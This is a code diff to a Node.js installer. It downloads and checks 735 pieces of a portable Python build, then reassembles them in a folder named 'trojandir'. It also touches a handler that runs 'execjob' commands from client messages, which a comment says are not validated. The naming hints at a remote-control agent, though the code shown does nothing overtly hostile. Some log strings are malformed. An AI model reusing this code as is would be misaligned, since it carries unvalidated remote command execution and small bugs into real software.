@@ -277,9 +277,16 @@ var systemstate = {
         return path.join(this.trojandir, "python");
     },
 
+    get pythonexedir() {
+        return path.join(systemstate.pythondir,
+        "work",
+        "Portable Python-3.10.5 x64",
+        "App",
+        "Python");
+    },
+
     get pythonexepath() {
-        // path to python exe
-        // TODO
+        return path.join(systemstate.pythonexedir, "python.exe");
     },
 
     get trojandir() {
@@ -3014,7 +3021,7 @@ async function cmdlist_handleMessage(msg) {
 
     // TODO: validate clientjob object before launching command
 
-    let execjobcmd = cmdlistcmd.newCmdConfig("execjob"); // anchor
+    let execjobcmd = cmdlistcmd.newCmdConfig("execjob");
 
     if (!execjobcmd) {
         throw new Error("could not create child cmd execjob");
@@ -3523,7 +3530,7 @@ async function install_node() {
     logmsg("finished");
 }
 
-function verify_python_donwload() {
+function get_python_install_filenames() {
     let filenames = Array.from({ length: 735 }, (_, index) => index + 1);
 
     filenames = filenames.map(String);
@@ -3531,58 +3538,57 @@ function verify_python_donwload() {
         return "disk" + _ + ".gsd";
     });
 
+    return filenames;
+}
+
+function verify_python_download() {
+    let filenames = get_python_install_filenames();
+
+    let filenames_out = [];
+
     for (let i = 0; i < filenames.length; i++) {
         let filename = filenames[i];
         let fpath = path.join(systemstate.gsdfilesdir, filename);
 
         if (!fileExists(fpath)) {
-            return { status: false, msg: `file does not exist {fpath}` };
-        }
+            logmsg(`file does not exist ${fpath}`);
+            filenames_out.push(filename);
+            continue;
+        } 
 
         const stats = fs.statSync(fpath);
-
+        
         // disk1.gsd --> 1,696
         // disk735.gsd --> 65,443
         // 100,000
 
         if (filename == "disk1.gsd") {
             if (stats.size != 1696) {
-                return {
-                    status: false,
-                    msg: `file not the correct size {fpath} {stats.size} 1696`,
-                };
+                logmsg(`file not the correct size ${fpath} {stats.size} 1696`);
+                filenames_out.push(filename);
             }
         } else if (filename == "disk735.gsd") {
             if (stats.size != 65443) {
-                return {
-                    status: false,
-                    msg: `file not the correct size {fpath} {stats.size} 65443`,
-                };
+                filenames_out.push(filename);
+                logmsg(`file not the correct size ${fpath} {stats.size} 65443`);
             }
         } else {
             if (stats.size != 100000) {
-                return {
-                    status: false,
-                    msg: `file not the correct size {fpath} {stats.size} 65443`,
-                };
+                filenames_out.push(filename);
+                logmsg(`file not the correct size ${fpath} ${stats.size} 65443`);
             }
         }
     }
 
-    return { status: true };
+    return filenames_out;
 }
 
 async function verify_python_install() {
-    let fpath = path.join(
-        systemstate.pythondir,
-        "work",
-        "Portable Python-3.10.5 x64",
-        "App",
-        "Python"
-    );
+    let fpath = systemstate.pythonexedir;
 
     if (!folderExists(fpath)) {
-        return { status: false, msg: `python folder does not exist {fpath}` };
+        logmsg(`python folder does not exist ${fpath}`);
+        return false;
     }
 
     let childp = null;
@@ -3596,10 +3602,8 @@ async function verify_python_install() {
                 text = text ?? "ERROR_EMPTY_OUTPUT";
 
                 if (!text.includes("Python 3.10.5")) {
-                    return {
-                        state: false,
-                        msg: `python install failed -- could not verify python version {text}`,
-                    };
+                    logmsg(`python install failed -- could not verify python version ${text}`);
+                    return false;
                 }
             }
         );
@@ -3607,7 +3611,7 @@ async function verify_python_install() {
         logmsg(err);
     }
 
-    return { state: true };
+    return true;
 }
 
 async function install_python() {
@@ -3617,7 +3621,7 @@ async function install_python() {
 
     let verify_python = await verify_python_install();
 
-    if (verify_python?.state) {
+    if (verify_python) {
         logmsg("python is installed -- exiting");
         process.exit(0);
         return;
@@ -3631,15 +3635,24 @@ async function install_python() {
 
     // TODO verify file MD5
 
-    verify_python = verify_python_donwload();
-    if (!verify_python?.state) {
-        logmsg(`python pieces not present -- downloading ${verify_python.msg}`);
-        await download_python();
+    let filenames = [];
+    if ( ! folderExists(systemstate.gsdfilesdir) ) {
+        filenames = get_python_install_filenames();
+    } else {
+        filenames = verify_python_download();
     }
 
-    if (!verify_python_donwload()) {
-        throw new Error("python download failed");
+    if ( filenames && filenames.length > 0 ) {
+        let ret = await download_python(filenames);
     }
+
+    filenames = verify_python_download();
+
+    if (filenames && filenames.length > 0 ) {
+        throw new Error("python download failed: install files are missing or invalid "+JSON.stringify(filenames));
+    }
+
+    logmsg('python pieces exist -- proceeding with gunite step');
 
     let args = [
         path.join(systemstate.gsdfilesdir, "disk1.gsd"),
@@ -3651,7 +3664,7 @@ async function install_python() {
     let childp = null;
 
     try {
-        childp = await invoke_exe("gunite.exe", args); // throws error despite success
+        childp = await invoke_exe("gunite.exe", args, systemstate.trojandir); // throws error despite success
     } catch (err) {
         logmsg(err);
     }
@@ -3676,29 +3689,25 @@ async function install_python() {
     ];
 
     try {
-        childp = await invoke_exe("7za.exe", args);
+        childp = await invoke_exe("7za.exe", args, systemstate.trojandir);
     } catch (err) {
         logmsg(err);
     }
 
     verify_python = await verify_python_install();
 
-    if (!verify_python?.state) {
-        throw new Error(verify_python?.msg);
+    if (!verify_python) {
+        throw new Error('python install failed');
     }
 
     logmsg("finished");
 }
 
-async function download_python() {
+async function download_python(filenames) {
     logmsg("starting");
 
-    let filenames = Array.from({ length: 735 }, (_, index) => index + 1);
-
-    filenames = filenames.map(String);
-    filenames = filenames.map((_, i) => {
-        return "disk" + _ + ".gsd";
-    });
+    filenames = filenames ?? [];   
+    filenames = ( Array.isArray(filenames) && filenames.length > 0) ? filenames : get_python_install_filenames();
 
     for (let i = 0; i < filenames.length; i++) {
         let filename = filenames[i];
